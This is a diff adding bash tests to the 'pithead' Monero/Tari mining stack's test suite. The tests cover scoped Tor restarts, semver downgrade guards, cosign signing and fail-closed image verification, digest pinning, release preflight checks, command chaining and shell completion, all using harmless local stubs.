@@ -250,6 +250,29 @@ assert_contains "tor egress probe: WARN never fails doctor (rc 0)" "$out" "rc=0"
 out="$(RUNNING_CONTAINERS="" PATH="$DRBIN:$PATH" run_sourced "$SANDBOX" check_tor_clearnet_egress 2>&1)"
 assert_contains "tor egress probe: tor down -> info skip" "$out" "isn't running"
 
+echo "== unit: stack_restart — scoped tor restart (#424) =="
+# `restart` bare restarts the whole stack; `restart tor` restarts ONLY tor (fresh guard
+# selection when clearnet egress is stuck); anything else is rejected — other containers must
+# go through apply/upgrade so a recreate applies current args (#273).
+RSTBIN="$SANDBOX/rstbin"
+make_stubs "$RSTBIN"
+RSTLOG="$SANDBOX/restart-docker.log"
+: >"$RSTLOG"
+out="$(DOCKER_LOG="$RSTLOG" PATH="$RSTBIN:$PATH" run_sourced "$SANDBOX" stack_restart 2>&1)"
+assert_contains "bare restart restarts the whole stack" "$(cat "$RSTLOG")" "compose restart"
+assert_not_contains "bare restart is not tor-scoped" "$(cat "$RSTLOG")" "compose restart tor"
+: >"$RSTLOG"
+out="$(DOCKER_LOG="$RSTLOG" PATH="$RSTBIN:$PATH" run_sourced "$SANDBOX" stack_restart tor 2>&1)"
+assert_contains "restart tor restarts only the tor container" "$(cat "$RSTLOG")" "compose restart tor"
+assert_contains "restart tor warns that circuits drop" "$out" "circuits drop"
+assert_contains "restart tor points at the doctor verify" "$out" "doctor"
+: >"$RSTLOG"
+out="$(DOCKER_LOG="$RSTLOG" PATH="$RSTBIN:$PATH" run_sourced "$SANDBOX" stack_restart p2pool 2>&1)"
+rc=$?
+assert_rc "restart rejects any service but tor" "$rc" "1"
+assert_contains "restart rejection names the contract" "$out" "takes no argument, or 'tor'"
+assert_eq "rejected restart touches no container" "$(cat "$RSTLOG")" ""
+
 echo "== unit: is_ipv4 =="
 run_sourced "$SANDBOX" is_ipv4 "0.0.0.0" >/dev/null 2>&1
 assert_rc "accepts 0.0.0.0" "$?" "0"
@@ -267,6 +290,18 @@ run_sourced "$SANDBOX" is_ipv4 "example.com" >/dev/null 2>&1
 assert_rc "rejects hostname" "$?" "1"
 run_sourced "$SANDBOX" is_ipv4 "" >/dev/null 2>&1
 assert_rc "rejects empty" "$?" "1"
+
+echo "== unit: semver_newer (#59 — the upgrade downgrade guard) =="
+# The comparison gates the upgrade button: a lexical bug would let 1.9.0 look "newer" than 1.10.0
+# and could be leveraged to force an older, vulnerable release.
+run_sourced "$SANDBOX" semver_newer "v1.10.0" "v1.9.0" >/dev/null 2>&1
+assert_rc "1.10.0 is newer than 1.9.0 (no lexical bug)" "$?" "0"
+run_sourced "$SANDBOX" semver_newer "v1.9.0" "v1.10.0" >/dev/null 2>&1
+assert_rc "1.9.0 is NOT newer than 1.10.0" "$?" "1"
+run_sourced "$SANDBOX" semver_newer "v1.3.1" "v1.3.1" >/dev/null 2>&1
+assert_rc "equal versions are not newer" "$?" "1"
+run_sourced "$SANDBOX" semver_newer "v2.0.0" "v1.99.99" >/dev/null 2>&1
+assert_rc "major bump beats a high minor/patch" "$?" "0"
 
 echo "== unit: resolve_dashboard_host (dashboard.host 'auto' revert, 247c5a0) =="
 # A configured dashboard.host is used verbatim.
@@ -342,6 +377,10 @@ case "$(run_sourced "$SANDBOX" describe_change PROXY_STRATUM_PASSWORD oldpw newp
 *DEST*) ok "stratum pw change hides the secret (DEST, no value shown)" ;;
 *) bad "stratum pw change hides the secret" "expected DEST" ;;
 esac
+# Tor guard self-heal toggle (#424): INFO either way, and the enable warns about circuits dropping.
+assert_contains "tor auto-heal enable is INFO" "$(run_sourced "$SANDBOX" describe_change TOR_AUTO_HEAL false true)" "INFO"
+assert_contains "tor auto-heal enable names the cost" "$(run_sourced "$SANDBOX" describe_change TOR_AUTO_HEAL false true)" "drops ALL Tor circuits"
+assert_contains "tor auto-heal disable names the manual fix" "$(run_sourced "$SANDBOX" describe_change TOR_AUTO_HEAL true false)" "restart tor"
 # Dev-fee donate-level (#173): a brief restart (INFO), shown as a percentage.
 assert_contains "donate-level is INFO" "$(run_sourced "$SANDBOX" describe_change PROXY_DONATE_LEVEL 0 1)" "INFO"
 assert_contains "donate-level shows pct" "$(run_sourced "$SANDBOX" describe_change PROXY_DONATE_LEVEL 0 1)" "0% → 1%"
@@ -588,6 +627,90 @@ upg_onion_order=$(
 )
 assert_eq "upgrade runs ensure_onion_password before config validation (#355)" \
     "$(printf '%s\n' "$upg_onion_order" | grep -xE 'onionpw|validate' | tr '\n' ',')" "onionpw,validate,"
+
+# #376: on a release install, `upgrade` must verify the image signatures BEFORE anything is pulled
+# or recreated. If a refactor drops or reorders the verify_release_images call, "verify" goes
+# missing or lands after "compose" and this fails — the wiring half of the fail-closed guarantee
+# (the decision itself is black-boxed below).
+upg_sig_order=$(
+    cd "$SANDBOX" || exit
+    # shellcheck disable=SC1090
+    source "$STACK"
+    set +e
+    require_env() { :; }
+    ensure_onion_password() { :; }
+    parse_and_validate_config() { :; }
+    load_preserved_state() { :; }
+    ensure_directories() { :; }
+    resolve_dashboard_host() { :; }
+    render_env() { :; }
+    mv() { :; }
+    inject_service_configs() { :; }
+    generate_caddyfile() { :; }
+    provision_control_runner() { :; }
+    migrate_compose_project() { :; }
+    is_source_checkout() { return 1; }
+    log() { :; }
+    docker() { :; }
+    apply_tor_egress_firewall() { :; }
+    verify_release_images() { echo verify; }
+    compose_up_checked() { echo compose; }
+    stack_upgrade
+)
+assert_eq "upgrade verifies release-image signatures before 'compose up' (#376)" \
+    "$(printf '%s\n' "$upg_sig_order" | grep -xE 'verify|compose' | tr '\n' ',')" "verify,compose,"
+
+echo "== black-box: verify_release_images fail-closed gate (#376) =="
+# The verification decision itself, against a fake cosign on a PINNED PATH ($VRI/bin:/usr/bin:/bin
+# — coreutils stay, any real cosign install on the host disappears, so the host can never decide
+# the outcome). A release install is a dir without build/dashboard/Dockerfile.
+VRI="$SANDBOX/verify376"
+mkdir -p "$VRI/bin"
+cat >"$VRI/bin/cosign" <<'EOF'
+#!/usr/bin/env bash
+echo "[cosign] $*" >>"${COSIGN_LOG:-/dev/null}"
+exit "${COSIGN_RC:-0}"
+EOF
+chmod +x "$VRI/bin/cosign"
+
+# No cosign.pub (an install older than the first signed release): documented fallback — proceed,
+# but say loudly that nothing was verified.
+out="$(PATH="/usr/bin:/bin" run_sourced "$VRI" verify_release_images 2>&1)"
+assert_rc "no pubkey -> upgrade proceeds (documented fallback)" "$?" "0"
+assert_contains "no pubkey -> loud NOT-verified warning" "$out" "NOT be signature-verified"
+
+# cosign.pub present but no cosign binary anywhere on PATH: FAIL CLOSED with an install pointer —
+# a missing verifier must not silently disable verification.
+printf 'fake release public key' >"$VRI/cosign.pub"
+out="$(PATH="/usr/bin:/bin" run_sourced "$VRI" verify_release_images 2>&1)"
+assert_rc "pubkey without cosign -> upgrade aborts" "$?" "1"
+assert_contains "cosign-missing abort points at the install doc" "$out" "not installed"
+
+# Valid signatures (fake cosign exits 0): all 5 images verified with the committed key, no Rekor
+# (--private-infrastructure), against the digest-bearing tag compose will pull.
+: >"$VRI/cosign.log"
+out="$(PATH="$VRI/bin:/usr/bin:/bin" COSIGN_LOG="$VRI/cosign.log" \
+    PITHEAD_REGISTRY="ghcr.io/test" STACK_VERSION="v9.9.9" run_sourced "$VRI" verify_release_images 2>&1)"
+assert_rc "valid signatures -> upgrade proceeds" "$?" "0"
+assert_eq "all 5 first-party images verified" "$(grep -c '^\[cosign\] verify ' "$VRI/cosign.log")" "5"
+assert_contains "verify uses the committed key + --private-infrastructure" \
+    "$(cat "$VRI/cosign.log")" "verify --key cosign.pub --private-infrastructure ghcr.io/test/pithead-tor:v9.9.9"
+
+# A signature that does not verify (fake cosign exits 1): FAIL CLOSED. This is the red test for the
+# whole feature — bypass or soften the verification and it goes green-to-broken.
+out="$(PATH="$VRI/bin:/usr/bin:/bin" COSIGN_RC=1 \
+    PITHEAD_REGISTRY="ghcr.io/test" STACK_VERSION="v9.9.9" run_sourced "$VRI" verify_release_images 2>&1)"
+assert_rc "bad signature -> upgrade aborts (fail closed)" "$?" "1"
+assert_contains "bad-signature abort names the image" "$out" "Signature verification FAILED for ghcr.io/test/pithead-tor:v9.9.9"
+
+# Source checkout: locally built images are unsigned by design — skipped, silently and completely.
+mkdir -p "$VRI/build/dashboard"
+touch "$VRI/build/dashboard/Dockerfile"
+: >"$VRI/cosign.log"
+out="$(PATH="$VRI/bin:/usr/bin:/bin" COSIGN_RC=1 COSIGN_LOG="$VRI/cosign.log" run_sourced "$VRI" verify_release_images 2>&1)"
+assert_rc "source checkout -> verification skipped" "$?" "0"
+assert_eq "source checkout -> cosign never invoked" "$(cat "$VRI/cosign.log")" ""
+rm -rf "$VRI/build"
 
 # apply had the same after-compose ordering bug as #272's stack_upgrade — fixed alongside #291. Take
 # the no-change-but-incomplete-marker retry path so apply recreates containers without the interactive
@@ -929,6 +1052,18 @@ caddy_onion_ph="$(
 assert_contains "onion HTTP vhost renders even before the address is captured (#343)" "$caddy_onion_ph" "http://172.28.0.1 {"
 assert_not_contains "no HTTPS onion vhost until the .onion address is provisioned (#343)" "$caddy_onion_ph" "https://placeholder"
 
+echo "== unit: generate_caddyfile access log (#349) =="
+# Every vhost logs each request as one JSON line to a shared file. Growth is bounded by Caddy's
+# native rolling (4 MiB per file, current + 2 rolled); mode 0644 lets the non-root dashboard
+# read what root-run Caddy writes (Caddy's own default is 0600, unreadable across the mount).
+assert_contains "access log block rendered" "$caddy_https" "output file /var/log/caddy/access.log"
+assert_contains "access log is JSON" "$caddy_https" "format json"
+assert_contains "access log growth is bounded (roll_size)" "$caddy_https" "roll_size 4MiB"
+assert_contains "rolled files are capped (roll_keep)" "$caddy_https" "roll_keep 2"
+assert_contains "access log stays dashboard-readable (mode 0644)" "$caddy_https" "mode 0644"
+log_count="$(printf '%s' "$caddy_onion_https" | grep -c 'output file /var/log/caddy/access.log')"
+assert_eq "every vhost (LAN + onion HTTP + onion HTTPS) writes the shared log" "$log_count" "3"
+
 echo "== unit: onion client-auth crypto (#343) =="
 # Portable base32 (RFC 4648 vectors) — no external `base32` binary (absent on macOS).
 assert_eq "b32encode_hex('f') = MY" "$(run_sourced "$SANDBOX" b32encode_hex 66)" "MY"
@@ -1117,6 +1252,48 @@ assert_eq "status onion: nothing when the onion is disabled" \
     "$(run_sourced "$od_off" dashboard_onion_status)" ""
 rm -rf "$od_on" "$od_noauth" "$od_unprov" "$od_off"
 
+echo "== unit: dashboard_sync_progress re-renders per-chain sync from /api/state (#384) =="
+# The one-curl re-render behind `pithead status`: read the dashboard's own /api/state (host-local,
+# no auth) and print per-chain progress, skipping synced chains and degrading quietly when the app
+# isn't up. Stub curl to serve a canned body — real jq parses it, matching the dashboard's shape.
+SP="$(mktemp -d)"
+mkdir -p "$SP/bin"
+cat >"$SP/bin/curl" <<'EOF'
+#!/usr/bin/env bash
+[ -n "${CURL_BODY:-}" ] && printf '%s' "$CURL_BODY"
+exit "${CURL_RC:-0}"
+EOF
+chmod +x "$SP/bin/curl"
+# Monero mid-sync + Tari still discovering its target height: both surface, monero with numbers.
+sp_body='{"sync":{"monero":{"state":"syncing","percent":87,"current":2451000,"target":2810000,"remaining":359000},"tari":{"state":"loading","percent":0,"current":0,"target":0,"remaining":0}}}'
+out="$(CURL_BODY="$sp_body" PATH="$SP/bin:$PATH" run_sourced "$SANDBOX" dashboard_sync_progress 2>&1)"
+assert_contains "sync progress: monero syncing shows percent + blocks-to-go" "$out" "87% (2451000 / 2810000 blocks, 359000 to go)"
+assert_contains "sync progress: no-target chain reads as discovering" "$out" "discovering the target height"
+assert_contains "sync progress: header names the #35 hold" "$out" "held until it completes"
+# Both synced: nothing to say (steady-state status stays quiet), non-zero return.
+sp_done='{"sync":{"monero":{"state":"done","percent":100,"current":10,"target":10,"remaining":0},"tari":{"state":"done","percent":100,"current":5,"target":5,"remaining":0}}}'
+assert_eq "sync progress: both synced -> silent" \
+    "$(CURL_BODY="$sp_done" PATH="$SP/bin:$PATH" run_sourced "$SANDBOX" dashboard_sync_progress 2>&1)" ""
+# Only monero still syncing: the synced tari is omitted (not listed as done).
+sp_partial='{"sync":{"monero":{"state":"syncing","percent":42,"current":100,"target":238,"remaining":138},"tari":{"state":"done","percent":100,"current":5,"target":5,"remaining":0}}}'
+out="$(CURL_BODY="$sp_partial" PATH="$SP/bin:$PATH" run_sourced "$SANDBOX" dashboard_sync_progress 2>&1)"
+assert_contains "sync progress: partial -> monero listed" "$out" "monero"
+assert_not_contains "sync progress: partial -> synced tari omitted" "$out" "tari"
+# Dashboard app not answering yet (curl fails): quiet, non-zero — graceful during startup.
+assert_eq "sync progress: dashboard down -> silent" \
+    "$(CURL_RC=22 PATH="$SP/bin:$PATH" run_sourced "$SANDBOX" dashboard_sync_progress 2>&1)" ""
+rm -rf "$SP"
+
+echo "== unit: first-run epilogue shows once after up (#384) =="
+# The "what happens next" onboarding note: prints on the first up in a fresh deploy dir, drops a
+# marker beside .env, and stays silent on every later restart.
+FR="$(mktemp -d)"
+out="$(run_sourced "$FR" print_first_run_epilogue 2>&1)"
+assert_contains "first-run: epilogue explains the sync-then-mine hold" "$out" "held until Monero and Tari finish their first sync"
+assert_eq "first-run: silent on the second up (marker respected)" \
+    "$(run_sourced "$FR" print_first_run_epilogue 2>&1)" ""
+rm -rf "$FR"
+
 echo "== unit: host detection (#140) =="
 # detect_os reads ID / VERSION_ID / PRETTY_NAME from an overridable os-release (drives the
 # 'supported on Ubuntu 24.04' check); a missing file leaves the fields empty (caller warns).
@@ -1262,11 +1439,23 @@ assert_contains "bundle ships the tari config dir" "$BUILD_MOUNTS" "./build/tari
     TAG=v9.9.9
     REGISTRY=ghcr.io/test
     DRY_RUN=0
+    # make_bundle now digest-pins the first-party images (#376), so it needs the promoted digests
+    # promote would have captured -- a full repo@sha256 ref, as set_digest stores them.
+    for _s in "${IMAGES[@]}"; do set_digest "$_s" "ghcr.io/test/pithead-$_s@sha256:feed${_s}dad"; done
     make_bundle "$WORKDIR/pithead.tar.gz" >/dev/null 2>&1
+    cp "$WORKDIR/pithead/docker-compose.yml" "$SANDBOX/bundle-compose.yml" 2>/dev/null || true
     tar tzf "$WORKDIR/pithead.tar.gz" 2>/dev/null
 ) >"$SANDBOX/bundle.list" 2>/dev/null
 grep -q '^pithead/config.minimal.json$' "$SANDBOX/bundle.list" && ok "bundle ships config.minimal.json (basic quick-start config)" || bad "bundle ships config.minimal.json" "absent from the bundle"
 grep -q '^pithead/$' "$SANDBOX/bundle.list" && ok "bundle unpacks to versionless pithead/" || bad "bundle unpacks to pithead/" "top-level dir is not pithead/"
+# Every first-party image line in the bundled compose must be digest-pinned (#376).
+_bundle_unpinned=$(grep -E 'pithead-(tor|monero|p2pool|xmrig-proxy|dashboard):' "$SANDBOX/bundle-compose.yml" 2>/dev/null | grep -cv '@sha256:')
+[ "${_bundle_unpinned:-1}" -eq 0 ] && ok "bundle compose digest-pins all 5 first-party images (#376)" || bad "bundle digest-pins first-party images (#376)" "unpinned lines: ${_bundle_unpinned:-?}"
+if grep -q 'pithead-dashboard:${STACK_VERSION:-dev}@sha256:feeddashboarddad' "$SANDBOX/bundle-compose.yml" 2>/dev/null; then
+    ok "digest pin appends only the bare sha256, no double-repo (#376)"
+else
+    bad "digest pin format (#376)" "expected tag@sha256:digest on the dashboard image line"
+fi
 _bm_missing=""
 for _m in $BUILD_MOUNTS; do [ -e "$ROOT/$_m" ] || _bm_missing="$_bm_missing $_m"; done
 assert_eq "every compose ./build runtime mount exists in the tree" "${_bm_missing:-none}" "none"
@@ -1343,6 +1532,151 @@ for tier in "donor:1_000:1 kH/s" "vip:10_000:10 kH/s" "whale:100_000:100 kH/s" "
         bad "XvB $t_name tier docs match TIER_DEFAULTS" "config $t_val / doc '$t_human' out of sync"
     fi
 done
+
+echo "== unit: release.sh registry read retries GHCR read-after-push lag (#429) =="
+# manifest_digest reads a tag GHCR just accepted, which can 404 for a few seconds (read-after-push
+# lag) — this killed stage-4 digest capture twice on v1.3.1. retry_registry_read must retry until the
+# read resolves. Stub buildx_inspect to fail the first two calls (empty + rc 1) then succeed; a counter
+# file survives the retries. Backoff forced to 0 keeps the test instant.
+RETRY_CNT="$SANDBOX/inspect.count"
+# shellcheck disable=SC1090,SC2034  # dynamic source; REGISTRY_READ_* are read by the sourced retry helper
+retry_out="$(
+    cd "$ROOT" || exit
+    set --
+    source "$REL" 2>/dev/null
+    set +eu
+    REGISTRY_READ_BACKOFF=0
+    printf 0 >"$RETRY_CNT"
+    buildx_inspect() {
+        local n
+        n=$(($(cat "$RETRY_CNT") + 1))
+        printf '%s' "$n" >"$RETRY_CNT"
+        [ "$n" -lt 3 ] && return 1                  # attempts 1 and 2 fail (tag not yet readable)
+        printf 'Name: x\nDigest: sha256:deadbeef\n' # attempt 3 resolves
+    }
+    printf 'DIGEST=%s ATTEMPTS=%s\n' "$(manifest_digest some:tag)" "$(cat "$RETRY_CNT")"
+)"
+assert_contains "manifest_digest resolves after transient GHCR failures" "$retry_out" "DIGEST=sha256:deadbeef"
+assert_contains "retried until the read succeeded (3 attempts)" "$retry_out" "ATTEMPTS=3"
+# Genuinely-missing image: after the retries exhaust, manifest_digest stays empty so the caller's
+# `[ -n "$digest" ] || die` still stops the release (a missing image must not silently pass).
+# shellcheck disable=SC1090,SC2034  # dynamic source; REGISTRY_READ_* are read by the sourced retry helper
+exhaust_out="$(
+    cd "$ROOT" || exit
+    set --
+    source "$REL" 2>/dev/null
+    set +eu
+    REGISTRY_READ_BACKOFF=0
+    REGISTRY_READ_RETRIES=3
+    buildx_inspect() { return 1; } # GHCR never makes it readable
+    digest="$(manifest_digest gone:tag)"
+    [ -n "$digest" ] || echo "DIED-EMPTY"
+)"
+assert_contains "exhausted retries -> empty digest (caller dies)" "$exhaust_out" "DIED-EMPTY"
+# The smoke stage's raw manifest read has the same read-after-push exposure — wire it through the retry.
+assert_contains "smoke stage reads the manifest via retry_registry_read (#429)" \
+    "$(cat "$REL")" "retry_registry_read buildx_inspect \"\$repo:\$STAGING_TAG\" --raw"
+
+echo "== unit: release.sh preflight checks the lint toolchain (#426) =="
+# A reimaged release box loses shellcheck/shfmt/node/uv — the v1.3.0 cut died ~1 min in mid-gate with a
+# bare `shellcheck: not found`. check_release_toolchain must fail fast BEFORE building, naming the tool
+# and the provisioning doc. Point PATH at a sandbox of stub tools so the host's real PATH doesn't decide.
+RTB="$SANDBOX/release-tools"
+mkdir -p "$RTB"
+for t in shellcheck shfmt node npx uv uvx; do
+    printf '#!/usr/bin/env bash\nexit 0\n' >"$RTB/$t"
+    chmod +x "$RTB/$t"
+done
+# shellcheck disable=SC1090
+(
+    cd "$ROOT" || exit
+    set --
+    source "$REL" 2>/dev/null
+    set +eu
+    PATH="$RTB" check_release_toolchain >/dev/null 2>&1
+)
+assert_rc "full toolchain present -> preflight passes" "$?" "0"
+rm -f "$RTB/shfmt" # simulate a reimaged box missing one tool
+# shellcheck disable=SC1090
+tc_out="$(
+    cd "$ROOT" || exit
+    set --
+    source "$REL" 2>/dev/null
+    set +eu
+    PATH="$RTB" check_release_toolchain 2>&1
+)"
+tc_rc=$?
+assert_rc "missing tool -> preflight fails fast (rc 1)" "$tc_rc" "1"
+assert_contains "the missing tool is named" "$tc_out" "shfmt"
+assert_contains "error points at the provisioning doc" "$tc_out" "release-server.md"
+
+echo "== unit: release.sh signs the promoted digests (#376) =="
+# sign_images must sign the recorded manifest-LIST digest (repo@sha256:… — never the mutable tag,
+# never a per-arch child) with the box's key and no Rekor upload; the password never reaches argv.
+# A fake cosign records exactly what it was asked to sign.
+SIGN="$SANDBOX/sign376"
+mkdir -p "$SIGN/bin"
+cat >"$SIGN/bin/cosign" <<'EOF'
+#!/usr/bin/env bash
+echo "[cosign] $*" >>"${COSIGN_LOG:-/dev/null}"
+exit 0
+EOF
+chmod +x "$SIGN/bin/cosign"
+# shellcheck disable=SC1090,SC2030,SC2031,SC2034  # dynamic source; the globals are consumed inside sign_images
+sign_out="$(
+    cd "$ROOT" || exit
+    set --
+    source "$REL" 2>/dev/null
+    set +eu
+    WORKDIR="$SIGN"
+    DRY_RUN=0
+    COSIGN_ENABLED=1
+    COSIGN_KEY="/release-box/cosign.key"
+    export COSIGN_LOG="$SIGN/cosign.log"
+    PATH="$SIGN/bin:$PATH"
+    for s in "${IMAGES[@]}"; do set_digest "$s" "ghcr.io/test/pithead-$s@sha256:feed$s"; done
+    sign_images 2>&1
+)"
+assert_contains "sign stage announces itself" "$sign_out" "Sign the promoted digests"
+assert_eq "all 5 promoted digests signed" "$(grep -c '^\[cosign\] sign ' "$SIGN/cosign.log")" "5"
+assert_contains "signs the digest with the box key, no Rekor upload" "$(cat "$SIGN/cosign.log")" \
+    "sign --key /release-box/cosign.key --tlog-upload=false --yes ghcr.io/test/pithead-dashboard@sha256:feeddashboard"
+assert_not_contains "never signs a mutable tag" "$(cat "$SIGN/cosign.log")" ":v"
+# Opt-in (#376): with signing OFF, sign_images is a no-op -- no cosign calls, and it says why.
+: >"$SIGN/cosign-off.log"
+# shellcheck disable=SC1090,SC2030,SC2031,SC2034  # dynamic source; the globals are consumed inside sign_images
+sign_off_out="$(
+    cd "$ROOT" || exit
+    set --
+    source "$REL" 2>/dev/null
+    set +eu
+    WORKDIR="$SIGN"
+    DRY_RUN=0
+    COSIGN_ENABLED=0
+    export COSIGN_LOG="$SIGN/cosign-off.log"
+    PATH="$SIGN/bin:$PATH"
+    for s in "${IMAGES[@]}"; do set_digest "$s" "ghcr.io/test/pithead-$s@sha256:feed$s"; done
+    sign_images 2>&1
+)"
+assert_eq "signing off means no cosign invocations (#376 opt-in)" "$(grep -c '^\[cosign\]' "$SIGN/cosign-off.log")" "0"
+assert_contains "signing off announces the skip (#376 opt-in)" "$sign_off_out" "skipping image signatures"
+# The bundle gets a detached signature the #59 runner can fetch (pithead.tar.gz.sig), and the
+# committed public key ships INSIDE the bundle so a release install has its verifier beside pithead.
+# shellcheck disable=SC1090,SC2030,SC2031,SC2034
+(
+    cd "$ROOT" || exit
+    set --
+    source "$REL" 2>/dev/null
+    set +eu
+    DRY_RUN=0
+    COSIGN_KEY="/release-box/cosign.key"
+    export COSIGN_LOG="$SIGN/cosign.log"
+    PATH="$SIGN/bin:$PATH"
+    sign_bundle "$SIGN/pithead.tar.gz" "$SIGN/pithead.tar.gz.sig" >/dev/null 2>&1
+)
+assert_contains "bundle signed as a detached blob signature" "$(cat "$SIGN/cosign.log")" \
+    "sign-blob --key /release-box/cosign.key --tlog-upload=false --yes --output-signature $SIGN/pithead.tar.gz.sig"
+assert_contains "the bundle ships cosign.pub (the install-side verifier)" "$(cat "$REL")" "config.reference.json cosign.pub"
 
 echo "== unit: pull-vs-build mode (#44) =="
 # is_source_checkout / resolve_pull_policy / STACK_VERSION key off whether the image build CONTEXTS
@@ -1666,6 +2000,133 @@ rc=$?
 assert_rc "unknown command fails" "$rc" "1"
 assert_contains "unknown command message" "$out" "Unknown command"
 
+echo "== unit: chain validation (#94) =="
+# A chain must be judged as a whole BEFORE anything runs. validate_chain error-exits (rc 1) on the
+# first broken rule; run_sourced's subshell captures that without killing the suite.
+run_sourced "$SANDBOX" validate_chain apply upgrade >/dev/null 2>&1
+assert_rc "accepts 'apply upgrade'" "$?" "0"
+run_sourced "$SANDBOX" validate_chain apply upgrade status >/dev/null 2>&1
+assert_rc "accepts 'apply upgrade status'" "$?" "0"
+run_sourced "$SANDBOX" validate_chain upgrade down >/dev/null 2>&1
+assert_rc "accepts 'upgrade down' (down last)" "$?" "0"
+out="$(run_sourced "$SANDBOX" validate_chain logs status 2>&1)"
+assert_rc "rejects non-chainable command (logs)" "$?" "1"
+assert_contains "non-chainable message names the command" "$out" "logs"
+out="$(run_sourced "$SANDBOX" validate_chain apply apply 2>&1)"
+assert_rc "rejects duplicate command" "$?" "1"
+assert_contains "duplicate message" "$out" "twice"
+out="$(run_sourced "$SANDBOX" validate_chain up down 2>&1)"
+assert_rc "rejects 'up down' (contradictory run-state)" "$?" "1"
+assert_contains "contradiction message" "$out" "contradict"
+run_sourced "$SANDBOX" validate_chain down up >/dev/null 2>&1
+assert_rc "rejects 'down up'" "$?" "1"
+run_sourced "$SANDBOX" validate_chain up restart >/dev/null 2>&1
+assert_rc "rejects 'up restart'" "$?" "1"
+out="$(run_sourced "$SANDBOX" validate_chain down upgrade 2>&1)"
+assert_rc "rejects 'down upgrade' (down not last)" "$?" "1"
+assert_contains "down-not-last message" "$out" "last"
+
+echo "== unit: chain execution — order, fail-fast, exit code (#94) =="
+# run_chain re-invokes pithead per step via PITHEAD_SELF; a stub records the order and can be told
+# to fail a given step, so order/fail-fast/propagation are proven without a stack.
+CH="$SANDBOX/chain"
+mkdir -p "$CH"
+cat >"$CH/fake-pithead" <<'EOF'
+#!/usr/bin/env bash
+echo "ran $1" >>"$CHAIN_LOG"
+[ "$1" = "${CHAIN_FAIL_ON:-}" ] && exit 42
+exit 0
+EOF
+chmod +x "$CH/fake-pithead"
+: >"$CH/order.log"
+(
+    cd "$CH" || exit
+    # shellcheck disable=SC1090
+    source "$STACK"
+    set +e
+    export CHAIN_LOG="$CH/order.log"
+    PITHEAD_SELF="$CH/fake-pithead" run_chain apply upgrade status
+) >/dev/null 2>&1
+assert_rc "valid chain exits 0" "$?" "0"
+assert_eq "steps run left-to-right" "$(tr '\n' ',' <"$CH/order.log")" "ran apply,ran upgrade,ran status,"
+: >"$CH/order.log"
+out="$(
+    cd "$CH" || exit
+    # shellcheck disable=SC1090
+    source "$STACK"
+    set +e
+    export CHAIN_LOG="$CH/order.log" CHAIN_FAIL_ON=upgrade
+    PITHEAD_SELF="$CH/fake-pithead" run_chain apply upgrade status 2>&1
+)"
+assert_rc "failing step's exit code propagates (42)" "$?" "42"
+assert_eq "fail-fast: later steps never run" "$(tr '\n' ',' <"$CH/order.log")" "ran apply,ran upgrade,"
+assert_contains "report names the failed step" "$out" "step 2/3"
+assert_contains "report says what already ran" "$out" "Already ran: apply"
+assert_contains "report says what did not run" "$out" "Did not run: status"
+
+echo "== black-box: chain wiring — reject runs NOTHING, failure stops the chain (#94) =="
+CBX="$SANDBOX/chainbb"
+mkdir -p "$CBX"
+cp "$STACK" "$CBX/pithead"
+make_stubs "$CBX/bin"
+out="$(cd "$CBX" && DOCKER_LOG="$CBX/docker.log" PATH="$CBX/bin:$PATH" ./pithead up down 2>&1)"
+rc=$?
+assert_rc "'up down' rejected" "$rc" "1"
+assert_contains "'up down' rejection explains itself" "$out" "contradict"
+assert_eq "rejected chain has NO side effects (no docker calls)" "$(cat "$CBX/docker.log" 2>/dev/null)" ""
+# A valid chain whose first step fails (status without .env) stops there and reports the remainder.
+out="$(cd "$CBX" && PATH="$CBX/bin:$PATH" ./pithead status doctor 2>&1)"
+rc=$?
+assert_rc "mid-chain failure propagates non-zero" "$rc" "1"
+assert_contains "chain reached step 1" "$out" "step 1/2"
+assert_contains "chain reports the unrun remainder" "$out" "Did not run: doctor"
+# Single-command invocations with arguments are NOT chains: 'logs monerod' hits the normal
+# .env guard, not a chain error.
+out="$(cd "$CBX" && PATH="$CBX/bin:$PATH" ./pithead logs monerod 2>&1)"
+assert_rc "'logs <service>' stays single-command" "$?" "1"
+assert_contains "'logs <service>' hits the usual guard" "$out" "setup"
+assert_not_contains "'logs <service>' is not judged as a chain" "$out" "chain"
+
+echo "== completion: sources cleanly + no drift from the dispatch (#94) =="
+COMP="$ROOT/pithead-completion.bash"
+bash -c "source '$COMP'" >/dev/null 2>&1
+assert_rc "completion script sources cleanly in bash" "$?" "0"
+# Drift-guard: the completion's static list, pithead's PITHEAD_COMMANDS, and the labels of main's
+# dispatch case must all be the SAME set — adding/removing a subcommand in one place fails here.
+stack_cmds="$(
+    cd "$SANDBOX" || exit
+    # shellcheck disable=SC1090
+    source "$STACK" 2>/dev/null
+    printf '%s' "${PITHEAD_COMMANDS:-}"
+)"
+comp_cmds="$(
+    # shellcheck disable=SC1090
+    source "$COMP" 2>/dev/null
+    printf '%s' "${_pithead_commands:-}"
+)"
+dispatch_cmds="$(sed -n '/case "\$cmd" in/,/^    esac$/p' "$STACK" |
+    sed -n -e 's/^    \([a-z][a-z-]*\)).*/\1/p' -e 's/^    \([a-z][a-z-]*\) |.*/\1/p' | tr '\n' ' ')"
+dispatch_cmds="${dispatch_cmds% }"
+assert_eq "completion list == pithead's command list" "$comp_cmds" "$stack_cmds"
+assert_eq "dispatch case labels == pithead's command list" "$dispatch_cmds" "$stack_cmds"
+# Every chainable command must be a real command.
+chain_ok=1
+for c in $(
+    cd "$SANDBOX" || exit
+    # shellcheck disable=SC1090
+    source "$STACK" 2>/dev/null
+    printf '%s' "${PITHEAD_CHAINABLE:-}"
+); do
+    case " $stack_cmds " in *" $c "*) ;; *) chain_ok=0 ;; esac
+done
+assert_eq "chainable commands are a subset of the command list" "$chain_ok" "1"
+
+echo "== completion: suggestions (#94) =="
+out="$(bash -c "source '$COMP'; COMP_WORDS=('./pithead' 'up'); COMP_CWORD=1; _pithead; printf '%s\n' \"\${COMPREPLY[@]}\"" 2>/dev/null | tr '\n' ' ')"
+assert_eq "'up<tab>' offers up + upgrade" "$out" "up upgrade "
+out="$(bash -c "source '$COMP'; COMP_WORDS=('$ROOT/pithead' 'logs' ''); COMP_CWORD=2; _pithead; printf '%s\n' \"\${COMPREPLY[@]}\"" 2>/dev/null | tr '\n' ' ')"
+assert_eq "'logs <tab>' offers the compose service names" "$out" "tor monerod tari p2pool xmrig-proxy dashboard docker-proxy docker-control caddy "
+
 echo "== black-box: guards =="
 G="$SANDBOX/guard"
 mkdir -p "$G/build/tari"
@@ -1892,6 +2353,18 @@ case "$(cat "$V/Caddyfile")" in
